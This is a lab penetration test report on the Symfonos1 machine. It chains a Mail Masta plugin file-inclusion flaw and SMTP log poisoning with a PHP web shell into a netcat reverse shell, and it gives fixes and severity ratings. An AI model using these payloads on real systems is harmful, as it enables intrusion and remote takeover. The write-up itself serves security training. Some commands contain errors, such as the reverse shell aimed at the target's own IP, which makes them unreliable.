# Penetration Test Report for Symfonos1


## 1.0 Introduction
### 1.1 Introduction - scope
Machine : Symfonos1
Reference Report: PWKv1-Report
## 2.0 Methodologies
### 2.1 Information Gathering
The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, we was tasked with machine - ***Symfonos1***.

The specific IP addresses was:
* Symfonos1 Network: 192.168.100.2
* Local Kali Network: 192.168.100.4

### 2.2 Service Enumeration
    22/tcp，open，SSH
    25/tcp ，open，SMTP
    80/tcp ，open，HTTP
    139/tcp，open，Netbios-ssn
    445/tcp，open，Microsoft-ds

### 2.3 Penetration
* Vulnerability Exploited: WordPress Plugin Mail Masta 1.0 - Local File Inclusion
* System Vulnerable: 192.168.100.2
* Vulnerability Explanation: The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation. In this situation, Webshell can be attained by this vulnerability.
* Vulnerability Fix:
    1. ID assignation 
        * save your file paths in a secure database and give an ID for every single one, this way users only get to see their ID without viewing or altering the path
    2. Whitelisting  
        *  use verified and secured whitelist files and ignore everything else
    3. Use databases  
        *   don't include files on a web server that can be compromised, use a database instead
    4. Better server instructions 
        * make the server send download headers automatically instead of executing files in a specified directory

* Severity: High（CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N）
* Proof of Concept Code Here:
    ```
    Web Browser:
    
    http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
    ```

* Screenshot Here:
![](https://i.imgur.com/IQJ0zd9.png)

---

* Vulnerability Exploited: SMTP Log Poisoning
* System Vulnerable: 192.168.100.2
* Vulnerability Explanation: Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log. In this situation, we inject the malicious PHP code via telnet using SMTP service with default mail path /var/mail/helios to escalate the LFI to RCE, and execute "id" command to verify the user-id.
* Vulnerability Fix:
    1.  Perform input validation: 
        * Limit the character set and format to be what your requirements dictate and reject any input that fails to meet your expectations. 
        * Perform input validation on both the client and the server (as applicable).

* Severity: High（CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N）
* Proof of Concept Code Here:
    1. Step 1 : telnet to 192.168.100.2 25 and send malicious php code
    ```
    Local Kali Machine: 
    
    > telnet 192.168.100.2 25
    > <?php system($_GET['HAHA']); ?>
    ```
    2. Step 2 :
    ```
    Web Browser:
    
    http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&HAHA=id
    ```
* Screenshot Here:
![](https://i.imgur.com/s2eMg5K.png)

---

* Vulnerability Exploited: Remote Code Execution（RCE）
* System Vulnerable: 192.168.100.2
* Vulnerability Explanation: RCE will allow a malicious actor to execute any code of their choice on a remote machine over LAN, WAN, or internet. It belongs to the broader class of arbitrary code execution (ACE) vulnerabilities. After ensuring the feasibility of LFI with SMTP log poisoning, change id command to spawn the reverse shell.
* Vulnerability Fix:
    1. Patching your systems with the latest security updates is key to preventing Remote Code Execution exploits.

* Severity: High（CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H）
* Proof of Concept Code Here:
    1. Step 1 :
    ```
    Local Kali Machine: 
    > nc -lvp 4444
    ```
    2. Step 2 :
    ```
    Web Browser: 
    http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&haha=nc -e /bin/sh 192.168.100.2 4444
    ```
    3. Step 3 :
    ```
    Local Kali Machine: 
    > python -c 'import pty; pty.spawn("/bin/bash")'
    ```
* Screenshot Here:
![](https://i.imgur.com/hcp9fOq.png)

